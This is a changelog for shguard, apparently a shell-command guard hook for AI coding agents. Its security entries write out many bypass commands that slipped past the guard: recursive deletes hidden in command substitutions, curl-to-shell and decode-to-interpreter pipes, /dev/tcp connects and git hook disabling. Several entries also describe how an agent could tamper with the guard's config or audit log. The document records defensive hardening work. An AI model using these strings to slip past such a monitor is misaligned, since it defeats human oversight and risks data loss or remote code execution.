# Changelog

All notable changes to this project are documented in this file.

## [Unreleased]

### Security

- `reject_excessive_raw_nesting`'s `[[ ... ]]` extended-test-operator raw
  scan no longer lets a quoted `]]` token (`' ]] '`, which tokenizes as a
  standalone `]]` once surrounded by spaces) turn tracking off mid-region
  (#489). brush treats it as a literal quoted string, not a real closer;
  the prior quote-blind toggle let every `!`/`&&`/`||` after it go
  uncounted, reaching brush's own uncaught stack-overflow abort. Once a
  region opens, tracking is never turned back off within the same raw
  scan (only a fresh `[[` resets the count), the same "over-count is
  safe, under-count is not" posture this scanner already applies
  elsewhere.

- `git_push_plus_refspec`'s structural detection of a `+`-prefixed
  force-push refspec no longer misreads a separate-value flag's own operand
  (`git push -o +foo origin main`'s `+foo`, `-o`'s value) as the refspec
  (#504). The operand walk now recognizes `-o`/`--push-option`/`--repo`/
  `--exec`/`--receive-pack` and skips the value token they consume (a glued
  `=` spelling is an ordinary one-token flag, needing no special handling),
  and stops flag classification entirely after a bare `--` (git treats
  every word after it as positional, so `-o` there is a remote/refspec
  name, not the flag).
- `curl-wget-pipe-to-shell`'s pipeline sink match now recognizes a
  versioned/distro-suffixed shell binary (`dash5`) as the interpreter it
  normalizes to, the same way `is_pipeline_interpreter`/`is_shell_interpreter`
  already do (#497). This rule's own Block previously downgraded to the
  generic pipeline floor's Ask for a versioned sink, since
  `is_pipeline_interpreter` already recognized it elsewhere; a `sinks` entry
  that itself ends in a digit (`python3`) is compared literally and stays
  unaffected.

## [0.7.0] - 2026-09-08

### Added

- The PreToolUse hook's `permission_mode` field, and, inside a subagent,
  `agent_id`/`agent_type`, are now read from stdin (#468). `permission_mode`
  is parsed into a typed value with an `Unknown` variant that preserves any
  value this binary doesn't recognize, so a future harness mode never
  crashes or fails closed a Bash call. `permission_mode` and `agent_id` are
  recorded on the `decision_log_path` log line; `agent_type` is read but not
  yet logged. Purely additive at the time: none of the three fields played
  any part in the Allow/Ask/Block decision, and `shguard check` (no real
  hook stdin) logged `permission_mode`/`agent_id` as `null` (see #469 below
  for the first decision these fields do drive).
- New optional `ask_outcome` user-config key (default `"ask"`, `"allow"`
  rejected at load the same way `escalation_floor` rejects it): set
  `ask_outcome = "deny"` to floor every terminal `Ask` verdict
  `analyze_with_policy` would otherwise return to `Block` (#467).
  Autonomous sessions stall on an `Ask` with no human present to answer
  it, and under Claude Code's `bypassPermissions` mode an `Ask` isn't even
  a reliable control (one can permanently disable bypass for the rest of
  the session, anthropics/claude-code#37420); most `Ask` verdicts shguard
  emits in practice are structural fallbacks (an unresolved
  `$VAR`/`$(...)`, an interpreter heredoc/inline script, a
  parser-unsupported construct) rather than a rule written to expect a
  human in the loop, though the embedded blocklist does carry 21
  `decision = "ask"` rules too (`tar-directory-root-or-home`, the
  credential-shaped `[[token]]` floor, among others) that this key floors
  the same way, preserving a rule's own `deny_message` when it has one.
  The remap runs once, on the whole command line's final decision, so
  `fold_worst`'s worst-wins fold across a compound line still keeps a
  genuine `Block` rule's own id and `deny_message` rather than losing
  them to a generic floored-Ask reason, and `[[allow]]` entries keep
  rescuing exactly as before. A floored verdict is a `Block` with
  `matched_rule_id` left `null` and a reason naming `ask_outcome =
  "deny"` explicitly, letting
  `jq 'select(.reason | contains("ask_outcome = \"deny\""))'` isolate
  every floored `Ask` in a `decision_log_path` log for review; loosening
  one back via `[[allow]]` only works where an `[[allow]]` entry could
  already reach it (the escalation floor and credential-token floor are
  never allowlist-rescuable, so those stay a hard `Block` with no config
  escape). Also applied to the composition root's own fail-closed paths
  that never reach `analyze_with_policy` at all
  (malformed/oversized stdin, a missing `command` field, a stdin read
  error); a watchdog time/memory-budget trip and a config-load failure
  itself are excluded, staying `Ask`/`SHGUARD_STRICT_CONFIG`'s own
  behavior respectively.
- `ask_outcome` now also accepts a `[ask_outcome]` table keyed on the
  PreToolUse hook's `permission_mode` (#469), narrowing #467's one
  config-wide switch to the actual operator requirement: an `Ask` should
  reach a human only when a human is in the loop, and floor to `deny`
  whenever it can't (`default`/`plan`/`acceptEdits` typically stay `"ask"`,
  `auto`/`dontAsk`/`bypassPermissions` typically go `"deny"`). Any mode key
  the table omits keeps the built-in `"ask"` default; an unrecognized key
  fails config load closed, same as any other unrecognized config key.
  `"allow"` is rejected in every slot, same as the bare-string form, and
  the bare-string form itself is unchanged: it still floors every terminal
  `Ask` unconditionally regardless of `permission_mode`/`agent_id`. An
  optional `subagent` key overrides the mode-keyed value, in either
  direction, only when the hook stdin carries an `agent_id`, including
  when `permission_mode` itself is a value this binary doesn't recognize;
  a `permission_mode` the hook stdin omits, or an unrecognized value,
  otherwise resolves to `"ask"` regardless of what the table configures
  for any named mode. `shguard check` gained a `--permission-mode <mode>`
  flag so a replay resolves a table-form `ask_outcome` identically to a
  real hook invocation carrying that mode, including matching
  `decision_log_path` output; with no flag, `check` resolves the same
  conservative way an absent `permission_mode` always did. `Policy::ask_outcome`
  (the library's own public API) now takes a `&HookContext` parameter to
  resolve against, a breaking change for any caller that used it directly.
- Built-in structural `Ask` verdicts (rule 1 command substitution, rule 2
  bare `$VAR`, rule 4's unresolvable target, rule 5 pipe-to-interpreter,
  rule 6b/6d inline interpreter code, a parser-unsupported construct, and
  an `$IFS`-derived word) now carry a category-specific `deny_message`
  instead of #467's one generic rewrite hint (#471). Each message names
  the actual construct and the concrete rewrite (e.g. write inline
  `python3 - <<EOF`/`node -e`/`awk 'prog'` code to a file and run the
  file; resolve a command-position `$(...)` yourself and re-issue the
  literal binary name), so a `deny` reached via `ask_outcome = "deny"`
  gives an agent something actionable instead of a blind retry loop.
  Surfaces via the existing `additionalContext` wiring with no adapter or
  wire-format change, and survives a `bash -c` re-wrap and the
  argument-position-substitution floor the same way a rule-authored
  `deny_message` already did (the #202 class). Several raw Rust
  `Debug`-format leaks into agent-facing reason/deny-message text found
  along the way were also fixed.

### Fixed

- `Rules::match_pipeline` now folds worst-wins across declaration order,
  same as `match_command`/`match_redirect_target`/`match_token` already
  did (#465): a future embedded or user `[[pipeline]]` rule declaring
  `decision = "ask"` for the same sources/sinks shape as an existing
  `"block"` rule can no longer shadow it just by being declared first.
  Latent-only at the time: every embedded pipeline rule is `"block"`
  today.
- `shguard check --json` usage errors (missing/extra arguments, an
  invalid `--permission-mode` usage) now emit `{"error": "..."}` on
  stdout, matching the existing config-load-failure and
  evaluation-timeout behavior, whenever `--json` was already parsed by
  the time the error is raised (#465). Arguments are parsed left to
  right, so a `--json` flag positioned after the offending argument is
  never reached and that case still falls back to a human-readable
  stderr message.
- Every generated self-protection rule's `normalized_prefix` target named
  the config directory without a trailing slash, and `normalized_prefix`
  is a plain `starts_with`, so a sibling directory that merely shared the
  string prefix - `~/.config/shguard-backup`, `~/.config/shguardX` -
  was denied too (#460). The generated prefix now includes the trailing
  slash, with a separate exact `normalized` target added for the
  directory itself so a command naming it exactly is still covered.
- `SHGUARD_CONFIG=/dev/null`, a long-standing idiom (predating this
  crate, #59) for loading an empty user config so only the embedded
  ruleset applies, silently generated self-protection rules for the
  literal directory `/dev/null` resolves to (`/dev`), denying every
  `/dev/...` target including the extremely common `2>/dev/null`/
  `>/dev/null` idiom (#461). `self_protection_directories` now drops only
  the final hop of the symlink chain when its fully-resolved target
  isn't a regular file, leaving every earlier hop - in particular a
  config file that is itself a symlink to `/dev/null` - still
  self-protected. `scripts/smoke.sh`'s stale "verified against
  src/config.rs" comment is corrected to match.
- `Env` is line-scoped and never distinguished a persisting reassignment
  from a command-scoped prefix assignment (`X=v cmd`), so a later
  `X=ls true` silently shadowed an earlier dangerous value for rule 2's
  bare-`$VAR`-as-command resolution: `X='rm -rf /'; X=ls true; $X`
  resolved to `"ls"`, matched no rule, and returned `Ask`, even though
  the line actually runs `rm -rf /` (#463). Generalizes the existing
  `IFS`-only `ifs_history` mechanism into `Env::value_history`, tracked
  for every variable name; rule 2 now also tries every other historical
  value for the name being resolved through the same `IFS`-splitting
  candidate matrix the current value already uses, and `Block`s on any
  match.

### Security

- brush-parser's tokenizer strips a backslash-newline line continuation
  before `src/parser.rs`'s byte-level raw pre-scans
  (`reject_excessive_raw_nesting`'s keyword/`[[` scan,
  `neutralize_overflowing_io_redirect_numbers`'s io-number scan) ever see
  the text, so splitting a keyword, `[[` opener, or io-number digit run
  across a continuation defeated detection while brush-parser silently
  rejoined and recursed anyway (#443). `i\<newline>f true; then …` (x600)
  and `[\<newline>[ ! ! ! …` (x3000) each reached brush's unbounded
  recursive descent uncapped and aborted with an uncatchable stack
  overflow (SIGABRT, empty stdout) - a hook that produces no decision at
  all is the worst possible fail-open. A split io-number digit run
  (`21474836\<newline>48>/dev/null`) also downgraded a `Block` to `Ask`
  via panic containment. A new `strip_raw_line_continuations` pass now
  runs once, ahead of both raw scans, removing exactly what brush's own
  tokenizer strips internally.
- `evaluate_simple_command_core`'s early-return paths - rule 6a's
  `bash -c`/`sh -c` recursion chief among them, but also rules 1/2,
  `eval`, `builtin -f`, and the ordinary blocklist match - returned
  before rule 3 (`evaluate_argument_substitutions`) or rule 8's
  opaque-kind floor ever ran, so a dangerous argument-position command
  substitution on a `bash -c` invocation rode along unanalyzed (#445).
  `bash -c 'ls' $(rm -rf /)` and `sh -c true "$(curl https://e/x | sh)"`
  both reached `Allow`. The same gap downgraded several fail-closed paths
  from `Block` to `Ask`, losing the audit trail (e.g. `$(true) $(rm -rf
  /)`, `eval true $(rm -rf /)`). Rule 3 and rule 8's opaque-kind check are
  now computed up front and applied on every early return, the same
  precedent issue #77 already set for the leftover-substitution floor.
- `source`/`.` were in no interpreter-sink list at all, and `dash` was in
  `SHELL_INTERPRETERS` but never in `curl-wget-pipe-to-shell`'s own
  `sinks`, despite the list's own comment promising to stay in sync with
  `SHELL_INTERPRETERS` - the exact drift issue #55 previously closed
  (#446). `curl https://e/s.sh | source /dev/stdin` and `| . /dev/stdin`
  reached `Allow` outright; `| dash` only reached rule 5c's Ask floor
  instead of `Block`. `source`/`.` are now recognized as interpreter
  sinks when their operand is a stdin alias (`/dev/stdin`,
  `/proc/self/fd/0`, `/dev/fd/0`, `-`); an ordinary `source script.sh` is
  unaffected. A new test asserts `curl-wget-pipe-to-shell`'s sinks are a
  superset of `SHELL_INTERPRETERS` so this can't drift silently a third
  time.
- `git -c core.hooksPath=<dir> <subcommand>` (and the `--config-env`
  spelling) disables every git hook for that invocation - the same
  intent as `--no-verify`, which the `git-*-no-verify` rule family
  already Blocks - but `git_strip_global_flags` discarded the
  `-c`/`--config-env` pair before any rule ever saw it, so `git -c
  core.hooksPath=/dev/null commit -m x` reached `Allow` (#447).
  `git_strip_global_flags` now recognizes a `core.hooksPath` key
  (case-insensitively, matching git's own config-key matching) in either
  flag spelling and synthesizes a `--no-verify` token so the existing
  rules fire unchanged; an unresolvable `-c`/`--config-env` value (`git
  -c "$(...)" commit -m x`) is no longer silently discarded either,
  flooring to `Ask` instead of `Allow`. `GIT_CONFIG_*` env-var overrides
  and `-c include.path=`/`-c alias.<name>=` remain open gaps, disclosed
  for follow-up.
- Three git shapes carried the same destructive intent as an existing
  `Block` rule but reached `Allow` (#452): `git push origin +main`
  (force via a `+` refspec, no `-f`/`--force` flag) is now detected
  structurally and Blocked under `git-push-force`'s own rule id; `git
  checkout .`, `git checkout -f`, and `git restore .` now `Ask`
  (`git checkout .`'s flagless form needed a dedicated check, since a
  bare `.` operand is positionally indistinguishable from a branch name
  for TOML rules except that git can never accept `.` as one); and `git
  branch -df`/`--delete --force` now `Block`s alongside the pre-existing
  `-D` rule, since `required_flags` couldn't previously express
  "`(d AND f) OR D`".
- A same-invocation `alias NAME=VALUE` was never linked to a later
  bare-word call, unlike a same-line shell function definition (#75)
  (#448). With `shopt -s expand_aliases` set and the call on a later
  line of the same command string, real non-interactive bash expands the
  alias, but shguard reached `Allow`: `shopt -s expand_aliases; alias
  x="rm -rf /"` followed by `x` on the next line. A new
  `scan_alias_definition_floor` now recurses each `alias` argument's own
  value and folds the recursed verdict worst-wins into the `alias`
  command's own verdict, unconditionally (not gated on
  `expand_aliases` being set) - mirroring how a same-line function
  definition already floors even when the function is never called. A
  composed later-call argv (`alias x='rm -rf'; x /`) is a documented
  residual, left for a future issue.
- Two path-identity gaps in the generated self-protection rules (#449): a
  symlinked directory *component* earlier in the config path (stow's
  default "folded" layout, `~/.config -> ~/dotfiles/config`) left the
  real, fully-resolved config directory unprotected, so `tee
  ~/dotfiles/config/shguard/config.toml` reached `Allow`; and the
  generated `normalized_prefix`/`normalized` targets compared bytes
  exactly, so a re-cased spelling of the config path on a
  case-insensitive filesystem (macOS APFS by default) also reached
  `Allow`. Every directory the existing symlink-chain walk finds is now
  additionally `canonicalize`d and protected under its own suffix, and
  the generated self-protection targets gain an opt-in
  `case_insensitive` comparison flag, set only on macOS
  (`cfg!(target_os = "macos")`) - ordinary user-authored rules keep
  today's byte-exact semantics.
- The generated self-protection ancestor rules covered `rm -r`, `mv`, and
  `rsync --delete` into an ancestor of the config directory, but not a
  recursive copy or archive extraction whose payload happens to contain
  `shguard/config.toml` (#450): `rsync -a payload/ ~/.config/`, `cp -r
  payload/. ~/.config/`, and `tar -xf p.tar -C ~/.config` all reached
  `Allow`. New `Ask`-tier ancestor rules now cover flagless `rsync`, `cp
  -r`/`-R`/`-a`/`--archive` (including `-t`/`--target-directory=`), `tar
  -x`/`--extract`/`--get` plus `-C`/`--directory`, and `unzip -d`
  (including its concatenated `-d<dir>` spelling), both for the resolved
  config path and, separately, for the literal `~/.config` spelling.
  `dcfldd` is now also covered by the resolved-path family alongside the
  pre-existing `dd` rule.
- Four related weaknesses in the `decision_log_path` audit trail, each
  individually low-severity but together meaning the log could be
  redirected, silently broken, or tampered with by the very agent it
  audits (#458): `Policy::load` followed a symlink at the log path with
  no `O_NOFOLLOW` on the actual append; a missing parent directory or an
  unwritable file passed the load-time check and then silently dropped
  every append forever; a relative `decision_log_path` was accepted and
  resolved against the hook's per-invocation cwd; and the log path
  itself had no self-protection at all (`rm`, `truncate -s0`, `ln -sf`
  against it were all `Allow`). `Policy::load` now uses
  `symlink_metadata` and rejects a symlink, requires the parent directory
  to exist, and rejects a non-absolute path, all failing config load
  closed; `open_log_file` now opens with `O_NOFOLLOW` on unix; and the
  log path's own directory is folded into the same self-protection
  deny-rule generation the config directory gets.
- The argv side has floored a named user's home (`rm -rf ~root`) to
  `Ask` since #80, but the redirect side had no counterpart: `echo x >>
  ~root/.zshrc` reached `Allow` while the same target under the invoking
  user's own home (`~/.zshrc`) already `Ask`s (#454). A new
  `scan_redirect_named_user_home_floor`, mirroring the existing
  `$HOME`-vs-`~` substitution floor (#203), substitutes a leading
  `~user` tilde piece with a bare `~`, renormalizes, and checks it
  against the existing redirect rule set, capped at `Ask` to match the
  argv-side floor's own posture.
- The binary's own watchdog trip arms (`emit_first_result`, memory and
  wall-clock) emitted the fail-closed `Ask` and exited without first
  checking whether the worker had already sent its real result, so a
  verdict computed just before the deadline - `Block` included - was
  silently replaced by `Ask` (#457), a verdict the user can click
  through. The library's own `watchdog::bounded` already guarded against
  exactly this race with a `try_recv` before failing closed; the
  binary's copy lacked it. Both trip arms now prefer a result already in
  the channel. The regression test that previously relied on this race
  (`SHGUARD_TEST_MEM_LIMIT_MB=1` against `echo hi`) was swapped for the
  #315 unbounded-allocating heredoc repro, which genuinely never
  produces a result.
- `src/lib.rs`'s own doc comment claimed the decision log always records
  the verdict `watchdog::bounded` returns, including its fail-closed
  `Ask` on a timeout - true for a direct library caller and for
  `shguard check`, but never true for the real PreToolUse hook path
  (#459): the binary's outer evaluation-timeout watchdog starts before
  config load and stdin read even run, so for a genuine hang it always
  wins the race against the inner watchdog, and the worker computing the
  real decision is abandoned before it ever reaches the log sink. The
  hook-path inputs most worth auditing - the ones that actually trip the
  watchdog, e.g. the #315 shape `<<$( |] ` - left no trace in the
  decision log at all. The command and context are now sent to the
  composition root immediately after stdin parsing, before the call that
  can hang, so a watchdog trip in the binary can append a best-effort log
  line (bounded by its own short timeout so a hung log target can't
  compound the hang the watchdog exists to bound) without ever delaying
  the actual hook response.
- Three filesystem-destruction shapes adjacent to an existing `Block`
  rule reached `Allow` (#453): bare `mkfs <device>` with no `-t` (the
  rule required `t|--type`, but util-linux `mkfs` defaults to ext2
  without it - just as destructive as the `-t ext4` spelling); `rm -r
  /*` and `rm -r /` with no `-f` (GNU/BSD `rm` only prompts for
  write-protected files, and only on a tty, so a plain `rm -r` still
  deletes every writable file non-interactively); and `rm -rf ./*` /
  `rm -rf *` (these lexically normalize to a component list distinct
  from `rm -rf .`'s, and GNU `rm` actually refuses the `.` spelling, so
  `./*`/`*` are the spellings that actually wipe the directory).
  `mkfs-dispatcher-any-filesystem` no longer requires a type flag, a new
  sibling `rm-recursive-dangerous-target` rule covers `-r`-without-`-f`
  against `/`, `/*`, and the `/dev/` prefix, and
  `rm-recursive-force-dangerous-target` gained a `*` target alongside
  `.`.
- `write_atomically` (used by `shguard init`) now creates its temp file
  with `OpenOptions::create_new` (`O_EXCL`) and an unpredictable
  filename suffix, instead of `File::create` (which follows an existing
  symlink) on a predictable `.{file}.tmp-{pid}` name (#465): anything
  with write access to the config directory could previously pre-plant a
  symlink at that name and have `shguard init`/config-write operations
  silently write through it instead of creating a genuinely new file.
- A non-UTF-8 config-directory path component -- reachable via a
  non-UTF-8 symlink target, either directly or via
  `self_protection_directories`'s own directory-component
  `canonicalize` resolution -- now fails config load closed instead of
  `to_string_lossy` silently substituting U+FFFD into a generated
  self-protection rule that could then never match the real path it was
  meant to protect (#465). Applies to both the config directory's own
  self-protection and the decision-log file's.
- The PreToolUse hook adapter no longer emits an explicit `permissionDecision:
  "allow"` for a non-`Bash` `tool_name` (#462). shguard only analyses shell
  commands, so `Write`/`Edit`/MCP tool calls were always out of scope, but
  `"allow"` is the value that suppresses Claude Code's own permission
  prompt, so under a hook matcher broader than `"Bash"` (`""`, `"*"`, or a
  second matcher entry), every non-Bash tool call was silently
  auto-approved instead of falling through to Claude Code's normal
  permission flow. The adapter now omits `permissionDecision` from its
  output entirely for these calls, genuinely deferring to that flow, while
  still emitting valid non-empty JSON so the README's fail-closed wrapper
  convention (empty stdout treated as `deny`) isn't tripped.
- A read-only `<` redirect to `/dev/tcp/host/port` or `/dev/udp/host/port`
  (`cat </dev/tcp/host/port`, `exec 3</dev/tcp/host/port`, and the same
  target reached via a `$()` substitution) now `Block`s (#455), closing
  the "known gap" disclosed in 0.6.2's `#425` entry: bash establishes the
  TCP/UDP connection when the pseudo-device is opened, regardless of
  which direction (`<`/`>`/`<>`) ends up used, so a read-only open is the
  same connect/beacon/download primitive the write-direction forms were
  already blocked for. Scoped narrowly to `/dev/tcp/`/`/dev/udp/`
  targets: an ordinary-file `<` redirect (`cat < file.txt`) is
  unaffected.
- An `[[allow]]` entry naming an awk-family interpreter (`awk`, `gawk`,
  `mawk`, `nawk`, `original-awk`) is now rejected at config load, the same
  way a `bash`/`eval`/`python3` entry already was (#451). Previously it
  loaded successfully and silently downgraded rule 6d's Ask for an
  un-introspectable awk script (`awk 'BEGIN{system("rm -rf /")}'`) to
  `Allow`.
- `$'...'` (ANSI-C quoting) combined with a backslash-newline line
  continuation anywhere in the command now fails closed to `Ask` (#444):
  brush-parser's tokenizer strips a `\`+newline pair inside the decoded
  value the same way it does outside quotes, but bash's own ANSI-C
  decoding does not treat `\`+newline as a recognized escape there and
  keeps the raw newline instead. Recursing into that decoded value as a
  nested script (`bash -c $'...'`) could previously let a `#` comment
  swallow a real command on the line bash actually keeps separate,
  reaching `Allow` for a root-deleting payload.
- The dir-stack tilde forms `~+<n>`/`~-<n>` still reached brush-parser
  0.4.0's unchecked digit-run `unwrap()` when `<n>` overflowed `usize`
  (#456), the same panic-discards-the-whole-command-line class issue #405
  fixed for plain `~<uid>`. A trailing `~+99999999999999999999` appended
  to an otherwise-`Block`-worthy command downgraded the verdict to `Ask`.
  Both dir-stack forms are now pre-empted into literal text the same way
  `~<uid>` already was.

## [0.6.4] - 2026-09-05

### Security

- The default config path (resolved from `XDG_CONFIG_HOME`/`HOME` when
  `SHGUARD_CONFIG` isn't set) resolving to nothing used to silently fall
  back to the embedded blocklist alone, dropping every user-defined rule
  with no indication (#433). It now fails closed the same way an explicit
  `SHGUARD_CONFIG` naming a missing file already did: every command asks
  for confirmation until a config file is created (even an empty one via
  `shguard init`).
- `shguard init --force` wasn't covered by any self-protection rule, so an
  adversarially-prompted agent could run it to erase every user-defined
  `deny`/`ask` rule in one hook-allowed command. `shguard init`, with or
  without `--force`, is now denied by the hook whenever a real config file
  already exists (#435).
- `XDG_CONFIG_HOME` set to a relative value was treated as usable, resolving
  the config path cwd-relative rather than falling through to the
  `HOME`-derived default (#436) - the same class of gap issue #59 already
  closed for an empty `HOME`. Now rejected the same way an empty value is.
- A missing or malformed user config resolved to `ask`, not `deny` (#440) -
  a confirmation dialog a hurried human can click through, not hard enough
  for a strict deployment. Setting the new `SHGUARD_STRICT_CONFIG` env var
  (any value counts as set) upgrades this specific failure to `deny`. It
  does not cover the separate PATH-miss/crash gap: if the `shguard` binary
  itself never runs (not on `PATH`, killed before producing output), the
  PreToolUse hook contract reads its empty stdout as an implicit allow, and
  no in-process flag can change that - every hook registration needs a
  wrapper that checks the exit code and non-empty stdout itself (see
  README's "Wrapping the binary to fail closed" section).

### Compatibility notes

- Any existing zero-config install with no `~/.config/shguard/config.toml`
  will start asking for confirmation on every command after upgrading,
  until `shguard init` is run once. CI pipelines running
  `shguard --check-config`/`shguard check` against a checkout with no
  deployed config will start seeing exit code 2 instead of 0.
- This "missing config" state suppresses the embedded blocklist's own
  `deny` verdicts down to `ask` too, not only user-declared rules: the
  merged policy is never built until a config file exists.
- `ConfigError` is now `#[non_exhaustive]` (adding `ConfigError::Missing`
  would otherwise be a breaking change for any downstream crate matching
  on it exhaustively).

## [0.6.2] - 2026-09-04

### Security

- shguard's published library API, `analyze()`/`analyze_with_policy()`, had
  no bound against #315's heredoc-tokenizer hang/OOM: only the `shguard`
  binary's own composition root carried watchdog protection, so a direct
  library consumer (e.g. `examples/probe`) still hit an unbounded hang
  (#319). Both entry points now run on a worker thread under their own
  wall-clock and RSS-*growth* budget (measured from the point the worker
  spawned, not an absolute cap, since a library host's own baseline memory
  footprint is unknown) and return `Ask` on a trip rather than killing the
  host process. Known gaps, both disclosed on `analyze()`'s doc comment: a
  tripped runaway worker thread is left detached, not terminated (Rust has
  no safe thread-cancel primitive), and the memory bound only has a real
  implementation on Linux/macOS; other platforms fall back to wall-clock
  alone. `Policy` is now `Clone` (rules/allowlist Arc-wrapped, so cloning
  for the watchdog's worker is a refcount bump, not a full ruleset copy).

- Six sites that build a `Verdict` from a matched rule dropped
  `deny_message` (issue #99) even though a rule genuinely matched: the
  partial-match floors (except-target, except-flags, ascent-descent,
  named-user-home, dirstack-tilde, directory-equals-tilde, unknown-cwd,
  same-line composed `cd`), plus `bash -c`/`fish -c` verdict re-wraps that
  preserved the inner verdict's `matched_rule` but not its `deny_message`
  (#202). All now forward it. Disclosed, not closed: a separate family of
  inner-verdict-flattening paths (`flock`/`su -c` and `find -exec`'s shared
  shell-string floor, argument-position substitution recursion,
  expansion-position recursion, the su-username shadow floor) still discard
  `deny_message` one frame up, since they flatten to a bare `Decision` or
  `(Decision, String)` before any `Verdict` is built. Wider than this
  issue's scope, so it's a documented known gap rather than fixed here.

- `~-`/`~N`/`~+N` dirstack-tilde forms with a real subdirectory tail (e.g.
  `dd of=~-/dev/sda`) fell through every floor to `Opaque`, matching
  nothing in any rule, even though `~-`/`~N`'s anchor (unlike `~+`'s
  `$PWD`) could be any absolute directory, making a descended-into tail
  just as namespace-relevant as an unresolved `../../etc/passwd` ascent
  (#133). Now reuses the existing ascent-descent `Ask` floor end to end.
  The same forms glued directly after an `=`-terminated flag
  (`--directory=~+`) were separately unfloored, neither hard-matched nor
  asked (#134); now covered by a new floor gated on the rule declaring any
  bare, unattached target. Both floors are capped at `Ask`, never a rule's
  own stricter decision, since shguard has no cwd/directory-stack state to
  resolve these against. Known residual: `rm -rf ~-/etc/passwd` still
  Allows, since `/etc/passwd` was never one of `rm-recursive-force-
  dangerous-target`'s own declared targets (a pre-existing target-coverage
  gap, not the mechanism gap this closes).

- GNU tar's own unambiguous long-option-abbreviation feature let
  `tar -x --dir=/ -f a.tar` (an abbreviation of `--directory=/`) Allow while
  the unabbreviated spelling correctly Blocked, and `tar --g -f a.tar -C /`
  degrade Block to Ask (#128). Abbreviations of `directory`/`extract`/`get`
  now canonicalize before matching. On the platform this project develops
  on, bsdtar (macOS's default `tar`) turned out to have its own gaps
  entirely: `tar -x --cd / -f a.tar` extracted over `/` while shguard
  Allowed it (bsdtar's `--cd` alias for `-C`, which GNU tar doesn't have),
  and `--absolute-names`/its bsdtar spelling `--absolute-paths` (and their
  abbreviations) left `tar-absolute-names-ask` unmatched. All now
  recognized. Verified against no other GNU tar long option being a prefix
  of `directory`/`extract`/`get`, so over-matching an ambiguous-in-reality
  prefix is harmless (real GNU tar itself refuses to run on a truly
  ambiguous prefix). Known gap: mv/install/cp-write-device's separate
  `--target-directory=` abbreviation is untouched (#214).

- `EXTRA_PIPELINE_INTERPRETERS` (rule 5b/5c's decode-then-execute pipeline
  Block) recognized `python`/`python3`/`node`/`perl` but not `ruby`, `lua`,
  `php`, `tclsh`, or `python2`, each of which shares the same "reads and
  executes a script from stdin when given no file argument" property, so
  `echo cm0gLXJmIC8= | base64 -d | ruby` Allowed while the identical shape
  piped into `sh`/`python3` correctly Blocked (#125). Now recognized.
  **Compatibility note:** a previously valid
  `[[allow]] command = "ruby"` (or `lua`/`php`/`tclsh`/`python2`) config
  entry now fails to parse, by design, consistent with the existing
  `python`/`node`/`perl` precedent. Known gaps opened as tracking issues,
  not fixed here: versioned binary names (`lua5.4`, `python3.12`, ...)
  bypass the exact-name match entirely (#346), and other stdin-executing
  interpreters worth auditing: `pwsh`, `osascript`, `deno`, `irb` (#347).

- `is_decode_stage` (rule 5b's decode-then-execute pipeline Block)
  hardcoded a fixed tool enumeration missing several standard decode tools:
  `openssl base64 -d`, `basenc --base64 -d`, and `xz -d`/`bzip2 -d`/
  `zstd -d` all Asked while `openssl enc -base64 -d`/`base64 -d`/`gunzip`
  correctly Blocked (#121). Now recognized, including `xz`/`bzip2`/`zstd`'s
  decompress-only sibling binaries (`unxz`, `xzcat`, `bunzip2`, `bzcat`,
  `unzstd`, `zstdcat`, `unlzma`, `lzcat`, `xzdec`, `lzmadec`) and flag-gated
  aliases (`lzma`, `zstdmt`), and `zstd`'s `--uncompress` alias. Known
  gaps, tracked as #349 rather than fixed here: `openssl`'s cipher-name-as-
  subcommand shape (`openssl aes-256-cbc -d`), GNU long-option abbreviation
  matching (`xz --dec`), and untouched alias binaries (`gzcat`, `pzstd`,
  `pigz -d`, `pbzip2 -d`, `uncompress`, the `lz4` family, `brotli`).

- `attached_value_flags` only recognized a declared short flag's glued
  value at the leading cluster position (`-xVALUE`), not glued into a
  non-leading position (`-sxVALUE`), even though real getopt-style
  short-cluster parsing treats both the same way once a cluster hits a
  value-taking flag (#214). `attached_value_candidate` now scans the whole
  cluster left-to-right for the first declared letter. Known residual,
  disclosed rather than fully closed: the widened scan can find a declared
  letter that's really inside an earlier, undeclared flag's own glued
  value, manufacturing a candidate that happens to match an
  `except_targets` alternative and silently flipping an otherwise-firing
  rule to suppressed. Accepted as an opt-in trade-off, guarded (not
  eliminated) by stopping the scan at any earlier letter the rule itself
  declares as value-taking.

- `pushd`/`popd` were folded into `cd`'s cwd tracking without modeling an
  actual directory stack, so any bare `pushd`/`popd` collapsed straight to
  `Poisoned` (Ask) instead of composing back to a real prior directory:
  `pushd A && pushd B && popd && rm config.toml` floored to Ask instead of
  inheriting the matched rule's own stricter decision (#210). Now models a
  real stack (capped at depth 64), with `pushd +N`/`-N`/`-`, an
  unrecognized flag, or `popd` with any argument poisoning the whole
  stack (not just the top), since those operations aren't linearly
  modeled. A confirmed Ask/Block-to-Allow bypass surfaced during review:
  `$()`/backtick/`eval` recursion reset the tracked stack to empty instead
  of inheriting it, so an inner `popd`/bare `pushd` there silently no-opped
  past a real outer stack frame: `pushd ~/.config/shguard && pushd /tmp &&
  cat $(popd && cp evil.toml config.toml)` Allowed where it should Ask.
  Fixed by seeding an unknown (poisoned) stack for in-process recursion
  (`eval`) while fresh-process recursion (`bash -c`) still correctly seeds
  empty. Known gap: `pushd` to a lexically-valid but nonexistent absolute
  path desyncs the modeled stack depth by one frame once a later `popd`
  unwinds past it; no clean fix without filesystem access this module
  deliberately never has (#353).

- `env -C`/`git -C`/`make -C`/`tar -C|--directory` each change the
  invoked process's own working directory for one invocation, changing how
  later relative arguments resolve; entirely unmodeled before (#209).
  Verified live: `env -C ~/.config/shguard cp evil.toml config.toml` was a
  genuine Allow-when-should-Block gap against `self-protect-config-cp-
  tilde`. Now composed (git/make's `-C` chains cumulatively per GNU
  semantics; tar's is positional and modeled single-occurrence-only, see
  #354 below). Follow-up review rounds found and closed several bypasses
  of the fix itself before it stabilized: a leading transparent wrapper
  (`nice env -C ~/.config/shguard cp evil.toml config.toml`) reopened the
  exact gap this closes; env's glued `-C<dir>` spelling was unrecognized;
  `git commit -C <commit>` misattributed an unrelated `-C` reuse as a cwd
  anchor; env's getopt clusters ending in `-C` (`-iC`, `-vC`, `-ivC`, glued
  `-iC<dir>`) bypassed composition entirely; and the same cluster-form gap
  was later confirmed live for make (`make -kC dir`) and tar (`tar -cC dir
  -f out.tar file`). All closed via a shared cluster-parsing helper reused
  from the wrapper-unwrap code so the anchor-extraction and
  command-locating parsers can't drift apart again. Known gaps, tracked
  rather than fixed here: tar's old-style dashless leading option cluster
  (`tar cCf dir archive`), unambiguous `--directory`/`--chdir`
